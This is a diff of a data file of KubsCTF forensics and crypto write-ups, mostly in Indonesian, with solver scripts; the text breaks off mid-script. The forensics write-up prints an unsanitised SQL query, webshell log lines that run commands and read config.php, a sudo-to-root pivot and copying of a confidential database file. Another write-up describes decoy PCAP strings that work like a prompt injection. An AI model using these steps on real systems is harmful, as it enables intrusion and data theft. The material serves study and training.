@@ -29,13 +29,8 @@ export const kubsctfWriteups: WriteUp[] = [
         "content": "The IV was derived from `ivx` and `ivm`:\n- `ivx = 0a001f0273760054` (Hex)\n- `ivm = \"M4r10Br0\"`\n- `IV = ivx XOR ivm = \"G4m3C4rd\"`"
       },
       {
-        "title": "Solution Script",
-        "content": "The following Python script was used to decrypt the ciphertext:",
-        "code": "from Crypto.Cipher import DES3\nfrom Crypto.Util.Padding import unpad\nimport base64\n\nk1 = base64.b64decode(\"TjFudDNuZG8=\")\nk2 = bytes([83, 51, 99, 117, 114, 49, 116, 121])\nk3 = bytes.fromhex(\"4b33792132303236\")\nkey = k1 + k2 + k3\n\nivx = bytes.fromhex(\"0a001f0273760054\")\nivm = b\"M4r10Br0\"\niv = bytes([a ^ b for a, b in zip(ivx, ivm)])\n\nciphertext_hex = \"072a8e75459a545679f3aa56a9fafb38871022de0c9bd5d7ef55e8dad7861662eb0fb630d9cdf9dd8c64a3a8ac28b86a\"\nciphertext = bytes.fromhex(ciphertext_hex)\n\ncipher = DES3.new(key, DES3.MODE_CBC, iv)\ndecrypted = cipher.decrypt(ciphertext)\nplaintext = unpad(decrypted, 8)\nprint(f\"Decrypted: {plaintext.decode()}\")"
-      },
-      {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "from Crypto.Cipher import DES3\r\nfrom Crypto.Util.Padding import unpad\r\nimport base64\r\n\r\n# Key components\r\nk1 = base64.b64decode(\"TjFudDNuZG8=\")\r\nk2 = bytes([83, 51, 99, 117, 114, 49, 116, 121])\r\nk3 = bytes.fromhex(\"4b33792132303236\")\r\nkey = k1 + k2 + k3\r\n\r\n# IV components\r\nivx = bytes.fromhex(\"0a001f0273760054\")\r\nivm = b\"M4r10Br0\"\r\niv = bytes([a ^ b for a, b in zip(ivx, ivm)])\r\n\r\n# Ciphertext\r\nciphertext_hex = \"072a8e75459a545679f3aa56a9fafb38871022de0c9bd5d7ef55e8dad7861662eb0fb630d9cdf9dd8c64a3a8ac28b86a\"\r\nciphertext = bytes.fromhex(ciphertext_hex)\r\n\r\n# Decryption\r\ncipher = DES3.new(key, DES3.MODE_CBC, iv)\r\ntry:\r\n    decrypted = cipher.decrypt(ciphertext)\r\n    plaintext = unpad(decrypted, 8)\r\n    print(f\"Decrypted: {plaintext.decode()}\")\r\nexcept Exception as e:\r\n    print(f\"Error: {e}\")\r\n    print(f\"Decrypted (raw): {decrypted.hex()}\")"
       }
     ],
@@ -59,42 +54,42 @@ export const kubsctfWriteups: WriteUp[] = [
     "analysis": "",
     "solution": [
       {
-        "title": "1. Recon awal",
+        "title": "Recon awal",
         "content": "Pertama saya enumerasi isi artefak dan menemukan file penting berikut:\n\n- `service/var/log/apache2/access.log`\n- `service/var/log/apache2/error.log`\n- `service/var/www/html/index.php`\n- `service/var/www/html/config.php`\n- `service/home/www-data/.bash_history`\n- `service/home/www-data/.ssh_key_key`\n- `DB/var/log/auth.log`\n- `DB/home/dbadmin/.bash_history`\n- `DB/home/dbadmin/.ssh_authorized_keys`\n\nIni langsung menunjukkan bahwa challenge ini bisa diselesaikan murni dari korelasi source code, web log, SSH artifact, dan shell history."
       },
       {
-        "title": "2. Menentukan initial access",
+        "title": "Menentukan initial access",
         "content": "File `service/var/www/html/index.php` berisi query SQL yang memakai parameter `id` tanpa sanitasi:\n\n\n\nItu adalah SQL Injection yang jelas.\n\nLog akses Apache memberi bukti eksploitasi yang sangat eksplisit:\n\n\n\nDari request ini terlihat attacker memakai:\n\n- `UNION SELECT`\n- `INTO OUTFILE`\n- payload PHP\n\nArtinya initial access diperoleh melalui **SQL Injection** pada `index.php`.",
         "code": "$id = $_GET['id'];\n$sql = \"SELECT title, content FROM articles WHERE id = $id\";"
       },
       {
-        "title": "3. Menentukan file yang di-upload",
+        "title": "Menentukan file yang di-upload",
         "content": "Request tadi juga sekaligus menunjukkan file yang ditulis ke server:\n\n- `/var/www/html/uploads/shell.php`\n\nNama filenya adalah `shell.php`.\n\nLog berikut mengonfirmasi file itu langsung dipanggil sebagai webshell:\n\n\n\nJadi file yang di-upload adalah **`shell.php`**.",
         "code": "192.168.1.100 - - [26/Mar/2026:10:16:15 +0300] \"GET /uploads/shell.php?cmd=id HTTP/1.1\" 200 30\n192.168.1.100 - - [26/Mar/2026:10:16:20 +0300] \"GET /uploads/shell.php?cmd=ls%20-la%20/home/www-data HTTP/1.1\" 200 200\n192.168.1.100 - - [26/Mar/2026:10:16:25 +0300] \"GET /uploads/shell.php?cmd=cat%20/var/www/html/config.php HTTP/1.1\" 200 500"
       },
       {
-        "title": "4. Pivot dari web server ke DB server",
+        "title": "Pivot dari web server ke DB server",
         "content": "Attacker lalu membaca `config.php` lewat webshell. Di file itu ada kredensial sensitif:\n\n- `SSH_HOST = 192.168.1.50`\n- `SSH_USER = dbadmin`\n- `SSH_KEY = /home/www-data/.ssh_key_key`\n\nDi host web server memang ada private key:\n\n- `service/home/www-data/.ssh_key_key`\n\nDi host DB ada authorized key milik `dbadmin`:\n\n- `DB/home/dbadmin/.ssh_authorized_keys`\n\nKeduanya cocok. Fingerprint private key dan public key sama.\n\nLalu `DB/var/log/auth.log` memberi bukti login SSH:\n\n\n\nJadi attacker kemudian beroperasi sebagai **`dbadmin`** pada DB server, lalu memakai `sudo` untuk naik ke root.",
         "code": "Mar 26 10:16:30 victim-db sshd[5680]: Accepted publickey for dbadmin from 192.168.1.10 port 54323 ssh-rsa SHA256:hK6cLRP4m5w60fHK1BGmWooBTXIWz+vtVHmuH/luoVQ\nMar 26 10:16:31 victim-db sshd[5681]: pam_unix(sshd:session): session opened for user dbadmin by (uid=0)\nMar 26 10:16:35 victim-db sudo: dbadmin : TTY=pts/0 ; PWD=/home/dbadmin ; USER=root ; COMMAND=/bin/bash"
       },
       {
-        "title": "5. Menentukan file yang dicopy",
+        "title": "Menentukan file yang dicopy",
         "content": "File `DB/home/dbadmin/.bash_history` adalah bukti paling langsung:\n\n\n\nFile yang dicopy adalah:\n\n- **`confidential_data.sql`**\n\nNama path sumber lengkapnya:\n\n- `/var/lib/mysql/confidential_data.sql`",
         "code": "cp /var/lib/mysql/confidential_data.sql /tmp/.backup_data\nls -la /tmp/\ncat /tmp/.backup_data\nrm /tmp/.backup_data"
       },
       {
-        "title": "6. Kesimpulan",
+        "title": "Kesimpulan",
         "content": "Empat komponen flag adalah:\n\n- Vulnerability: `SQLi`\n- Uploaded file: `shell.php`\n- User yang kemudian dipakai: `dbadmin`\n- File yang dicopy: `confidential_data.sql`\n\nSehingga flag finalnya adalah:",
         "code": "KubSTU{SQLi,shell.php,dbadmin,confidential_data.sql}"
       }
     ],
     "terminalOutputs": [],
-    "flag": "",
+    "flag": "KubSTU{SQLi,shell.php,dbadmin,confidential_data.sql}",
     "lessonsLearned": ""
   },
   {
     "id": "kubsuctf-foren-isthereportinenglish",
-    "title": "- Is the report in English?",
+    "title": "Is the report in English?",
     "category": "Foren",
     "difficulty": "Medium",
     "points": 0,
@@ -102,32 +97,32 @@ export const kubsctfWriteups: WriteUp[] = [
     "author": "Nattt",
     "ctfName": "KubsCTF",
     "tags": [],
-    "description": "Challenge ini memberi satu file PDF bernama `KUBSTU_Financial_Report_2025.pdf`. Kesan awalnya sederhana: ada laporan keuangan berbahasa Inggris, ada attachment ZIP, dan bahkan password ZIP juga ditampilkan terang-terangan di isi PDF. Karena itu justru patut curiga bahwa jalur tersebut hanya umpan.",
+    "description": "",
     "problemDescription": "Challenge ini memberi satu file PDF bernama `KUBSTU_Financial_Report_2025.pdf`. Kesan awalnya sederhana: ada laporan keuangan berbahasa Inggris, ada attachment ZIP, dan bahkan password ZIP juga ditampilkan terang-terangan di isi PDF. Karena itu justru patut curiga bahwa jalur tersebut hanya umpan.",
     "tools": [],
     "analysis": "",
     "solution": [
       {
-        "title": "1. Recon awal",
+        "title": "Recon awal",
         "content": "Langkah pertama adalah identifikasi file dan triage cepat:\n\n\n\nHasil penting dari tahap ini:\n\n- File memang PDF 2 halaman.\n- Ada warning `Invalid xref table`, jadi struktur PDF tidak sepenuhnya normal.\n- `strings` langsung menampilkan banyak sekali flag palsu.\n- Ada object `/EmbeddedFile`, artinya PDF memang menyimpan file terlampir.",
         "code": "file KUBSTU_Financial_Report_2025.pdf\nexiftool KUBSTU_Financial_Report_2025.pdf\npdfinfo KUBSTU_Financial_Report_2025.pdf\nstrings -a KUBSTU_Financial_Report_2025.pdf | rg \"KubSTU\\\\{|Embedded|Filespec|stream\""
       },
       {
-        "title": "2. Mengecek attachment PDF",
+        "title": "Mengecek attachment PDF",
         "content": "Dari object stream terlihat ada data ZIP yang tertanam di PDF. `binwalk` juga mengonfirmasi adanya archive pada offset tertentu.\n\n\n\nDari teks PDF yang terbaca, diketahui:\n\n- nama archive: `KUBGTU_FINANCIAL_DATA_2025.ZIP`\n- password: `FinanceKubSTU2025!`\n\nZIP kemudian diekstrak:\n\n\n\nIsi file hasil ekstraksi memang mengandung string berbentuk flag, tetapi jelas merupakan jebakan:\n\n- isi file menyebut akses tidak sah\n- formatnya terlalu teatrikal\n- ada mismatch ukuran internal\n- flag yang muncul bertema `F4k3_Fl4g...`\n\nJadi attachment bukan sumber flag asli.",
         "code": "binwalk KUBSTU_Financial_Report_2025.pdf\npdftotext KUBSTU_Financial_Report_2025.pdf -"
       },
       {
-        "title": "3. Menemukan lokasi payload sebenarnya",
+        "title": "Menemukan lokasi payload sebenarnya",
         "content": "Karena `xref` rusak, struktur mentah PDF perlu diperiksa. Setelah dilihat lebih teliti, object PDF normal berakhir cukup awal, tetapi area `trailer` berisi metadata yang sangat panjang dan tidak wajar.\n\n`qpdf --qdf --object-streams=disable` membantu menunjukkan bahwa trailer memiliki field metadata tambahan:\n\n- `/ArchivePassword`\n- `/HiddenAuditData`\n\nField `/HiddenAuditData (...)` ternyata berisi literal string PDF sangat besar, panjangnya sekitar 77 KB, penuh noise seperti:\n\n- `B64_...`\n- `ENC_...`\n- `KEY_...`\n- `FLAG: KubSTU{TEST_...}`\n- `SECRET='KubSTU{DUMMY_...}'`\n- berbagai baris palsu lain\n\nIni menjelaskan kenapa `strings` menghasilkan banyak flag decoy."
       },
       {
-        "title": "4. Memilah noise dan menemukan outlier",
+        "title": "Memilah noise dan menemukan outlier",
         "content": "Alih-alih decode semua token satu per satu, cara yang lebih efektif adalah mencari baris yang formatnya berbeda dari mayoritas filler. Di antara ratusan baris metadata palsu, ada satu baris yang sangat menonjol:\n\n\n\nBerbeda dari token lain, nilai ini tampak seperti Base64 utuh dan rapi. Setelah didecode:\n\n\n\nHasilnya:",
         "code": "DATA[9376]=\"S3ViU1RVe1BERl9NM3Q0ZDR0NF9GMHIzbnMxY3NfNGR2NG5jM2RfQ2g0bGwzbmczXzIwMjVfUzNjdXIzX0VtYjNkZDNkX0YxbDNfM25jcnlwdDEwbl9QcjB0MGMwbH0=\""
       },
       {
-        "title": "5. Inti challenge",
+        "title": "Inti challenge",
         "content": "Trik challenge ini ada pada tiga lapis distraksi:\n\n1. PDF terlihat normal dan berbahasa Inggris.\n2. Ada embedded ZIP dengan password valid, tetapi isinya flag palsu.\n3. Metadata PDF menyimpan blob besar `HiddenAuditData` yang dipenuhi ratusan decoy flag.\n\nFlag asli justru berada di metadata trailer, dalam satu baris Base64 yang sengaja disamarkan di antara noise."
       }
     ],
@@ -156,7 +151,7 @@ export const kubsctfWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "import re\r\nimport zlib\r\nimport base64\r\n\r\ndef solve():\r\n    with open('crypt.pdf', 'rb') as f:\r\n        content = f.read()\r\n    \r\n    # Find Object 5 which contains the hidden stream\r\n    # It is encoded with ASCII85 and then Flate compressed\r\n    start_marker = b'<~'\r\n    end_marker = b'~>'\r\n    \r\n    start = content.find(start_marker) + 2\r\n    end = content.find(end_marker, start)\r\n    \r\n    if start == 1 or end == -1:\r\n        print(\"Could not find the hidden stream.\")\r\n        return\r\n    \r\n    encoded_data = content[start:end]\r\n    \r\n    # Decode ASCII85\r\n    compressed_data = base64.a85decode(encoded_data)\r\n    \r\n    # Decompress Flate (zlib)\r\n    try:\r\n        decompressed = zlib.decompress(compressed_data).decode('utf-8', errors='ignore')\r\n    except Exception as e:\r\n        print(f\"Error decompressing: {e}\")\r\n        return\r\n    \r\n    # Extract characters from the stream\r\n    # The flag is formed by characters at y=100\r\n    matches = re.findall(r'BT 1 0 0 1 (\\d+) 100 Tm \\((.*?)\\) Tj ET', decompressed)\r\n    \r\n    # Sort by x coordinate\r\n    matches.sort(key=lambda x: int(x[0]))\r\n    \r\n    flag = \"\".join([m[1] for m in matches])\r\n    print(f\"Found flag: {flag}\")\r\n\r\nif __name__ == \"__main__\":\r\n    solve()"
       }
     ],
@@ -166,7 +161,7 @@ export const kubsctfWriteups: WriteUp[] = [
   },
   {
     "id": "kubsuctf-foren-ratte",
-    "title": "- Ratte (Forensics)",
+    "title": "Ratte (Forensics)",
     "category": "Foren",
     "difficulty": "Medium",
     "points": 0,
@@ -192,13 +187,8 @@ export const kubsctfWriteups: WriteUp[] = [
         "content": "- P1: `deadbeef42` (Key byte: `0x42`)\n- P2: `cc 53 02 09 37` -> `0x09^0x42=K`, `0x37^0x42=u`\n- P3: `cc b9 02 20 11` -> `0x20^0x42=b`, `0x11^0x42=S`\n- P4: `cc 75 02 16 17` -> `0x16^0x42=T`, `0x17^0x42=U`\n- P5: `cc cb 02 39 2c` -> `0x39^0x42={`, `0x2c^0x42=n`\n- ...\n- P21: `cc 1e 01 3f` -> `0x3f^0x42=}`\n\nThe complete flag is constructed by concatenating these XORed characters."
       },
       {
-        "title": "Solve Script",
-        "content": "",
-        "code": "key_byte = 0x42\npackets = [\n    'cc53020937', 'ccb9022011', 'cc75021617', 'cccb02392c', 'ccb102721d',\n    'cc61022f72', 'cc8e023071', 'cc00021d25', 'ccc8023071', 'cc40023232',\n    'cc6502732c', 'cc3b02251d', 'ccda02732c', 'cc2a021d36', 'cc45022a71',\n    'cc21021d26', 'cc45027630', 'cc2602291d', 'cc3f023470', 'cc1e013f'\n]\ndata = []\nfor p in packets:\n    b = bytes.fromhex(p)\n    data.extend(b[3:])\nflag = \"\".join(chr(x ^ key_byte) for x in data)\nprint(flag)"
-      },
-      {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "key = bytes.fromhex(\"deadbeef42\")\r\npackets = [\r\n    \"cc53020937\", # P2\r\n    \"ccb9022011\", # P3\r\n    \"cc75021617\", # P4\r\n    \"cccb02392c\", # P5\r\n    \"ccb102721d\", # P6\r\n    \"cc61022f72\", # P7\r\n    \"cc8e023071\", # P8\r\n    \"cc00021d25\", # P9\r\n    \"ccc8023071\", # P10\r\n    \"cc40023232\", # P11\r\n    \"cc6502732c\", # P12\r\n    \"cc3b02251d\", # P13\r\n    \"ccda02732c\", # P14\r\n    \"cc2a021d36\", # P15\r\n    \"cc45022a71\", # P16\r\n    \"cc21021d26\", # P17\r\n    \"cc45027630\", # P18\r\n    \"cc2602291d\", # P19\r\n    \"cc3f023470\", # P20\r\n    \"cc1e013f\"    # P21\r\n]\r\n\r\ndata = []\r\nfor p_hex in packets:\r\n    p = bytes.fromhex(p_hex)\r\n    data.extend(p[3:])\r\n\r\n# The user mentioned P2[4]^Key[4]='u', P3[3]^Key[4]='b', P5[3]^Key[4]='{'\r\n# This implies Key[4] (0x42) is a common XOR key.\r\n# We also noticed that XORing with 0x62 (0x42 ^ 0x20) changes case.\r\n\r\nflag = \"\"\r\nfor b in data:\r\n    res = b ^ 0x42\r\n    # Heuristic: if it's an uppercase letter that should probably be lowercase, flip it.\r\n    if ord('A') <= res <= ord('Z'):\r\n        # For 'KubSTU', we know the first few should be 'kubsu'\r\n        # 'K' -> 'k' (0x4b ^ 0x20 = 0x6b)\r\n        # 'S' -> 's' (0x53 ^ 0x20 = 0x73)\r\n        # 'T' -> 'u'? (0x54 ^ 0x21 = 0x75) - Wait, this is not a simple case flip.\r\n        pass\r\n    flag += chr(res)\r\n\r\nprint(flag)"
       }
     ],
@@ -216,7 +206,7 @@ export const kubsctfWriteups: WriteUp[] = [
     "author": "Nattt",
     "ctfName": "KubsCTF",
     "tags": [],
-    "description": "Challenge ini ternyata menyamarkan data eksfiltrasi di tengah traffic yang kelihatannya ramai dan acak. Dari awal, artefaknya cuma satu file, `Krasnodar.pcap`, jadi fokus analisis langsung ke network forensics.",
+    "description": "",
     "problemDescription": "Challenge ini ternyata menyamarkan data eksfiltrasi di tengah traffic yang kelihatannya ramai dan acak. Dari awal, artefaknya cuma satu file, `Krasnodar.pcap`, jadi fokus analisis langsung ke network forensics.",
     "tools": [],
     "analysis": "",
@@ -242,7 +232,7 @@ export const kubsctfWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\n\r\nimport re\r\nimport subprocess\r\n\r\n\r\nPCAP = \"Krasnodar.pcap\"\r\n\r\n\r\ndef main() -> None:\r\n    output = subprocess.check_output(\r\n        [\"tshark\", \"-r\", PCAP, \"-Y\", \"dns\", \"-T\", \"fields\", \"-e\", \"dns.qry.name\"],\r\n        text=True,\r\n    )\r\n    parts = []\r\n    for name in output.splitlines():\r\n        if \".exfiltrate.kubstu-ctf.ru\" not in name:\r\n            continue\r\n        prefix = name.split(\".exfiltrate.kubstu-ctf.ru\", 1)[0]\r\n        match = re.fullmatch(r\"v\\d{2}\\.([0-9a-f]{4})\", prefix)\r\n        if match:\r\n            parts.append(bytes.fromhex(match.group(1)).decode())\r\n    flag = \"\".join(parts)\r\n    print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
       }
     ],
@@ -275,26 +265,26 @@ export const kubsctfWriteups: WriteUp[] = [
         "content": "> We received a RAM dump, but for some reason we can't analyze it. Help us out.\n\n---"
       },
       {
-        "title": "Step 1 — Identify the File",
+        "title": "Identify the File",
         "content": "Artefak yang diberikan hanya satu file:\n\n\n\nHasilnya tidak memberi informasi berarti:\n\n\n\nUkuran file juga terlihat seperti dump RAM:\n\n\n\n\n\nSekilas ini tampak seperti memory dump mentah, tetapi signature format normal tidak ada.",
         "code": "file memory.raw"
       },
       {
-        "title": "Step 2 — Check for Obvious Data",
+        "title": "Check for Obvious Data",
         "content": "Pengecekan awal dengan `xxd`, `strings`, dan sampling di beberapa offset menunjukkan sesuatu yang aneh: hampir seluruh isi file adalah byte nol.\n\nContoh:\n\n\n\n\n\n`exiftool` juga memberi petunjuk penting:\n\n\n\nIni menandakan file bukan dump RAM biasa yang kaya artefak, melainkan carrier yang hampir kosong.",
         "code": "xxd -l 64 memory.raw"
       },
       {
-        "title": "Step 3 — Locate the Only Non-Zero Region",
+        "title": "Locate the Only Non-Zero Region",
         "content": "Karena file 2 GB ini hampir seluruhnya nol, pendekatan terbaik adalah mencari region non-zero.\n\nSetelah discan, ternyata hanya ada satu blok data yang benar-benar berisi:\n\n- start: `0x3df027ed`\n- end: `0x3df03088`\n- size: `2204` byte\n\nRegion itu lalu diekstrak menjadi `blob.bin`.\n\n---"
       },
       {
-        "title": "Step 4 — Inspect the Extracted Blob",
+        "title": "Inspect the Extracted Blob",
         "content": "Blob hasil ekstraksi tampak seperti data acak:\n\n\n\n\n\nTetapi hasil ini menyesatkan. Parser umum seperti `gpg`, `openssl`, `binwalk`, dan `foremost` tidak bisa mengekstrak apa pun yang valid dari blob tersebut.\n\nIni berarti kemungkinan besar kita tidak berhadapan dengan file terenkripsi yang utuh, melainkan data yang harus dibaca ulang dengan susunan byte berbeda.",
         "code": "file blob.bin"
       },
       {
-        "title": "Step 5 — Try Alternative Byte Layouts",
+        "title": "Try Alternative Byte Layouts",
         "content": "Karena ukuran blob kecil dan tidak punya plaintext langsung, langkah berikutnya adalah mencoba menata ulang byte-nya.\n\nStrategi yang berhasil adalah:\n\n1. anggap `blob.bin` sebagai matriks byte\n2. gunakan lebar 4 byte per baris\n3. baca ulang data per kolom, bukan per baris\n\nDengan kata lain, data ditransposisikan.\n\nScript pendek untuk mengujinya:\n\n\n\nSaat hasil `col` diperiksa, flag muncul jelas di dalam output:\n\n\n\n---",
         "code": "from pathlib import Path\n\nb = Path(\"blob.bin\").read_bytes()\nw = 4\nh = len(b) // w\nrows = [b[i*w:(i+1)*w] for i in range(h)]\ncol = bytes(rows[r][c] for c in range(w) for r in range(h))\nprint(col)"
       },
@@ -309,7 +299,7 @@ export const kubsctfWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\nimport re\r\nfrom pathlib import Path\r\n\r\n\r\nFLAG_RE = re.compile(rb\"KubSTU\\{[^}]+\\}\")\r\nBLOB_OFFSET = 0x3DF027ED\r\nBLOB_SIZE = 2204\r\n\r\n\r\ndef extract_blob(path: Path) -> bytes:\r\n    with path.open(\"rb\") as fh:\r\n        fh.seek(BLOB_OFFSET)\r\n        blob = fh.read(BLOB_SIZE)\r\n\r\n    if len(blob) != BLOB_SIZE:\r\n        raise ValueError(\"failed to read expected blob size\")\r\n\r\n    return blob\r\n\r\n\r\ndef transpose_width_4(blob: bytes) -> bytes:\r\n    width = 4\r\n    if len(blob) % width != 0:\r\n        raise ValueError(\"blob length is not divisible by 4\")\r\n\r\n    height = len(blob) // width\r\n    rows = [blob[i * width : (i + 1) * width] for i in range(height)]\r\n    return bytes(rows[r][c] for c in range(width) for r in range(height))\r\n\r\n\r\ndef main() -> None:\r\n    path = Path(\"memory.raw\")\r\n    blob = extract_blob(path)\r\n    reconstructed = transpose_width_4(blob)\r\n\r\n    match = FLAG_RE.search(reconstructed)\r\n    if not match:\r\n        raise SystemExit(\"flag not found\")\r\n\r\n    print(match.group().decode())\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
       }
     ],
@@ -357,8 +347,8 @@ export const kubsctfWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
-        "code": "#!/usr/bin/env python3\r\nimport re\r\nimport subprocess\r\nfrom pathlib import Path\r\n\r\n\r\nPCAP = Path(\"chall.pcap\")\r\nRAW = Path(\"stream86.bin\")\r\nZIP = Path(\"stream86_alt.bin\")\r\nOUTDIR = Path(\"solve_out\")\r\nPASSWORD = \"IcyFl1pp3r$2026\"\r\n\r\n\r\ndef run(cmd: list[str]) -> str:\r\n    return subprocess.check_output(cmd, text=True)\r\n\r\n\r\ndef extract_stream() -> bytes:\r\n    out = run([\"tshark\", \"-r\", str(PCAP), \"-z\", \"follow,tcp,raw,86\"])\r\n    hex_chunks = re.findall(r\"\\b[0-9a-f]{20,}\\b\", out)\r\n    data = bytes.fromhex(\"\".join(hex_chunks))\r\n    RAW.write_bytes(data)\r\n    return data\r\n\r\n\r\ndef decode_zip(data: bytes) -> bytes:\r\n    iv = data[4:20]\r\n    body = data[24:]\r\n    plain = bytes(b ^ iv[i % 16] for i, b in enumerate(body))\r\n    ZIP.write_bytes(plain)\r\n    return plain\r\n\r\n\r\ndef extract_files() -> None:\r\n    if OUTDIR.exists():\r\n        subprocess.run([\"rm\", \"-rf\", str(OUTDIR)], check=True)\r\n    OUTDIR.mkdir()\r\n    subprocess.run(\r\n        [\"7z\", \"x\", \"-y\", f\"-p{PASSWORD}\", f\"-o{OUTDIR}\", str(ZIP)],\r\n        check=True,\r\n        stdout=subprocess.DEVNULL,\r\n    )\r\n\r\n\r\ndef main() -> None:\r\n    data = extract_stream()\r\n    decode_zip(data)\r\n    extract_files()\r\n    report = (OUTDIR / \"mission_report.txt\").read_text(encoding=\"utf-8\")\r\n    m = re.search(r\"KubSTU\\{[^}]+\\}\", report)\r\n    if not m:\r\n        raise SystemExit(\"Flag not found\")\r\n    print(m.group(0))\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
+        "content": "",
+        "code": "#!/usr/bin/env python3\r\nimport re\r\nimport subprocess\r\nfrom pathlib import Path\r\n\r\n\r\nPCAP = Path(\"chall.pcap\")\r\nRAW = Path(\"stream86.bin\")\r\nZIP = Path(\"stream86_alt.bin\")\r\nOUTDIR = Path(\"solve_out\")\r\nPASSWORD = \"IcyFl1pp3r$2026\"\r\n\r\n\r\ndef run(cmd: list[str]) -> str:\r\n    return subprocess.check_output(cmd, text=True)\r\n\r\n\r\ndef extract_stream() -> bytes:\r\n    out = run([\"tshark\", \"-r\", str(PCAP), \"-z\", \"follow,tcp,raw,86\"])\r\n    hex_chunks = re.findall(r\"\\b[0-9a-f]{20}\\b\", out)\r\n    data = bytes.fromhex(\"\".join(hex_chunks))\r\n    RAW.write_bytes(data)\r\n    return data\r\n\r\n\r\ndef decode_zip(data: bytes) -> bytes:\r\n    iv = data[4:20]\r\n    body = data[24:]\r\n    plain = bytes(b ^ iv[i % 16] for i, b in enumerate(body))\r\n    ZIP.write_bytes(plain)\r\n    return plain\r\n\r\n\r\ndef extract_files() -> None:\r\n    if OUTDIR.exists():\r\n        subprocess.run([\"rm\", \"-rf\", str(OUTDIR)], check=True)\r\n    OUTDIR.mkdir()\r\n    subprocess.run(\r\n        [\"7z\", \"x\", \"-y\", f\"-p{PASSWORD}\", f\"-o{OUTDIR}\", str(ZIP)],\r\n        check=True,\r\n        stdout=subprocess.DEVNULL,\r\n    )\r\n\r\n\r\ndef main() -> None:\r\n    data = extract_stream()\r\n    decode_zip(data)\r\n    extract_files()\r\n    report = (OUTDIR / \"mission_report.txt\").read_text(encoding=\"utf-8\")\r\n    m = re.search(r\"KubSTU\\{[^}]+\\}\", report)\r\n    if not m:\r\n        raise SystemExit(\"Flag not found\")\r\n    print(m.group(0))\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
       }
     ],
     "terminalOutputs": [],
@@ -375,7 +365,7 @@ export const kubsctfWriteups: WriteUp[] = [
     "author": "Nattt",
     "ctfName": "KubsCTF",
     "tags": [],
-    "description": "Challenge ini awalnya kelihatan seperti soal protokol custom biasa: dikasih `sugar_traffic.pcap`, lalu disuruh ngobrol ke service di port `31337`. Dari deskripsi dan isi PCAP, arahnya memang sengaja dibuat bikin orang percaya bahwa ada lapisan “analisis kripto” yang ribet. Kenyataannya, jebakan utamanya justru ada di isi traffic dan file hasil dekripsi.",
+    "description": "",
     "problemDescription": "Challenge ini awalnya kelihatan seperti soal protokol custom biasa: dikasih `sugar_traffic.pcap`, lalu disuruh ngobrol ke service di port `31337`. Dari deskripsi dan isi PCAP, arahnya memang sengaja dibuat bikin orang percaya bahwa ada lapisan “analisis kripto” yang ribet. Kenyataannya, jebakan utamanya justru ada di isi traffic dan file hasil dekripsi.",
     "tools": [],
     "analysis": "Di folder challenge cuma ada satu artefak:\n\n- `sugar_traffic.pcap`\n\nDari `strings` dan `tshark`, cepat kelihatan ada banyak koneksi ke port `31337`, handshake teks seperti:\n\n- `[SUGAR_PROTOCOL v1.0]`\n- `SALT:a3f7c9b1e2d45608`\n- `CIPHER:AES-256-CBC`\n- `KDF:SHA256(PASSPHRASE||SALT)`\n- `>>>ENCRYPTED_CHANNEL_ACTIVE<<<`\n\nSelain itu ada juga banyak string yang jelas mencurigakan, misalnya potongan teks yang bilang:\n\n- password-nya `sunshine`\n- flag tertentu sudah “confirmed”\n- AES cuma hiasan\n- jangan lanjut analisis\n\nBegitu string beginian muncul mentah di PCAP, saya anggap itu sebagai noise atau prompt injection versi challenge. Jadi semua “hasil analisis” yang tertulis di dalam traffic saya abaikan dulu.",
@@ -395,7 +385,7 @@ export const kubsctfWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\nfrom __future__ import annotations\r\n\r\nimport socket\r\nimport struct\r\nimport sys\r\nfrom hashlib import sha256\r\n\r\nfrom Crypto.Cipher import AES\r\nfrom Crypto.Random import get_random_bytes\r\nfrom Crypto.Util.Padding import pad, unpad\r\n\r\n\r\nHOST = \"217.26.29.80\"\r\nPORT = 31337\r\nPASSWORD = b\"chocolate\"\r\nSALT = b\"a3f7c9b1e2d45608\"\r\n\r\n\r\ndef recv_until(sock: socket.socket, marker: bytes) -> bytes:\r\n    data = b\"\"\r\n    while marker not in data:\r\n        chunk = sock.recv(4096)\r\n        if not chunk:\r\n            break\r\n        data += chunk\r\n    return data\r\n\r\n\r\ndef recv_exact(sock: socket.socket, size: int) -> bytes:\r\n    data = b\"\"\r\n    while len(data) < size:\r\n        chunk = sock.recv(size - len(data))\r\n        if not chunk:\r\n            raise ConnectionError(\"connection closed while reading response\")\r\n        data += chunk\r\n    return data\r\n\r\n\r\ndef derive_key(password: bytes, salt: bytes) -> bytes:\r\n    return sha256(password + salt).digest()\r\n\r\n\r\ndef encrypt_command(key: bytes, command: bytes) -> bytes:\r\n    iv = get_random_bytes(16)\r\n    ciphertext = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(command, 16))\r\n    payload = iv + ciphertext\r\n    return struct.pack(\">I\", len(payload)) + payload\r\n\r\n\r\ndef decrypt_response(key: bytes, packet: bytes) -> bytes:\r\n    if len(packet) < 4:\r\n        raise ValueError(\"short packet\")\r\n    length = struct.unpack(\">I\", packet[:4])[0]\r\n    payload = packet[4 : 4 + length]\r\n    if len(payload) != length:\r\n        raise ValueError(\"truncated encrypted payload\")\r\n    iv = payload[:16]\r\n    ciphertext = payload[16:]\r\n    plaintext = AES.new(key, AES.MODE_CBC, iv).decrypt(ciphertext)\r\n    return unpad(plaintext, 16)\r\n\r\n\r\ndef 